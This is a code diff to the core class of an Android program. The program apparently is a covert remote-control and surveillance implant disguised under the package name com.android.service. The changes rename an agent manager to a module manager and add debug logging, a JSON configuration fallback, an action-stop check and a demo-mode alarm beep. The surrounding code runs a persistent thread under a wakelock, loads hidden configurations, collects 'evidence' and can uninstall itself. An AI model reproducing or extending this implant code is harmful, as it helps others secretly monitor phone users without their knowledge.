@@ -7,26 +7,34 @@
 
 package com.android.service;
 
+import java.io.IOException;
+
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.res.Resources;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
+import android.media.RingtoneManager;
+import android.net.Uri;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
+import android.os.SystemClock;
 
-import com.android.service.Core.CheckAction;
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
-import com.android.service.event.BaseEvent;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.Markup;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
-import com.android.service.manager.ManagerAgent;
+import com.android.service.manager.ManagerModule;
 import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
@@ -54,7 +62,7 @@ public class Core extends Activity implements Runnable {
 	private ContentResolver contentResolver;
 
 	/** The agent manager. */
-	private ManagerAgent agentManager;
+	private ManagerModule moduleManager;
 
 	/** The event manager. */
 	private ManagerEvent eventManager;
@@ -62,7 +70,8 @@ public class Core extends Activity implements Runnable {
 	// private long queueSemaphore;
 	private Thread fastQueueThread;
 	private CheckAction checkActionFast;
-	
+	private PendingIntent alarmIntent = null;
+
 	/**
 	 * Start.
 	 * 
@@ -78,13 +87,13 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
-		
+
 		coreThread = new Thread(this);
 
-		agentManager = ManagerAgent.self();
+		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
 
 		resources = r;
@@ -113,7 +122,7 @@ public class Core extends Activity implements Runnable {
 		wl.acquire();
 
 		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$
-		
+
 		serviceRunning = true;
 		return true;
 	}
@@ -125,15 +134,15 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Stop() {
 		bStopCore = true;
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
 		}
-		
+
 		wl.release();
 
-		coreThread=null;
-		
+		coreThread = null;
+
 		serviceRunning = false;
 		return true;
 	}
@@ -141,7 +150,7 @@ public class Core extends Activity implements Runnable {
 	public static boolean isServiceRunning() {
 		return serviceRunning;
 	}
-	
+
 	// Runnable (main routine for RCS)
 	/*
 	 * (non-Javadoc)
@@ -172,7 +181,8 @@ public class Core extends Activity implements Runnable {
 					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
 				}
 
-				// Torna true in caso di UNINSTALL o false in caso di stop del servizio
+				// Torna true in caso di UNINSTALL o false in caso di stop del
+				// servizio
 				checkActions();
 
 				if (Cfg.DEBUG) {
@@ -269,7 +279,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(ex);//$NON-NLS-1$
 				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
 	}
@@ -292,7 +302,7 @@ public class Core extends Activity implements Runnable {
 			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
 		}
 
-		agentManager.stopAll();
+		moduleManager.stopAll();
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
@@ -366,8 +376,8 @@ public class Core extends Activity implements Runnable {
 			}
 
 			/*
-			 * if (agentManager.startAll() == false) { if (Cfg.DEBUG) {
-			 * Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$ }
+			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
+			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
 			 * 
 			 * return ConfType.Error; }
 			 */
@@ -426,8 +436,12 @@ public class Core extends Activity implements Runnable {
 	 */
 	public int loadConf() throws GeneralException {
 		boolean loaded = false;
-
 		int ret = ConfType.Error;
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (loadConf): TRY NEWCONF");
+		}
+		
 		// tries to load the file got from the sync, if any.
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 
@@ -446,6 +460,9 @@ public class Core extends Activity implements Runnable {
 
 		// get the actual configuration
 		if (!loaded) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY ACTUALCONF");
+			}
 			file = new AutoFile(Path.conf() + ConfType.ActualConf);
 
 			if (file.exists()) {
@@ -459,8 +476,35 @@ public class Core extends Activity implements Runnable {
 			}
 		}
 
+		if (!loaded && Cfg.DEBUG) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY JSONCONF");
+			}
+			
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
+			String json = new String(resource);
+			// Initialize the configuration object
+
+			if (json != null) {
+				final Configuration conf = new Configuration(json);
+				// Load the configuration
+				loaded = conf.loadConfiguration(true);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
+				}
+
+				if (loaded) {
+					ret = ConfType.ResourceJson;
+				}
+			}
+		}
+
 		// tries to load the resource conf
 		if (!loaded) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY RESCONF");
+			}
 			// Open conf from resources and load it into resource
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
 
@@ -561,7 +605,6 @@ public class Core extends Activity implements Runnable {
 					}
 
 					// UninstallAction.actualExecute();
-
 					exit = Exit.UNINSTALL;
 					break;
 				}
@@ -572,6 +615,13 @@ public class Core extends Activity implements Runnable {
 					}
 
 					continue;
+				} else {
+					if (subAction.considerStop()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (executeAction): stop");
+						}
+						break;
+					}
 				}
 			} catch (final Exception ex) {
 				if (Cfg.EXCEPTION) {
@@ -602,6 +652,24 @@ public class Core extends Activity implements Runnable {
 
 	}
 
+	public static void beep(Context context) throws IllegalArgumentException, SecurityException, IllegalStateException,
+	IOException {
+		if (Cfg.DEMO) {
+			Uri soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
+			MediaPlayer mMediaPlayer = new MediaPlayer();
+			mMediaPlayer.setDataSource(context, soundUri);
+
+			final AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+
+			if (audioManager.getStreamVolume(AudioManager.STREAM_ALARM) != 0) {
+				mMediaPlayer.setAudioStreamType(AudioManager.STREAM_ALARM);
+				mMediaPlayer.setLooping(true);
+				mMediaPlayer.prepare();
+				mMediaPlayer.start();
+			}
+		}
+	}
+	
 	public synchronized boolean reloadConf() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (reloadConf): START");
@@ -611,7 +679,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (reloadConf): valid conf");
 			}
-			
+
 			stopAll();
 
 			int ret = taskInit();
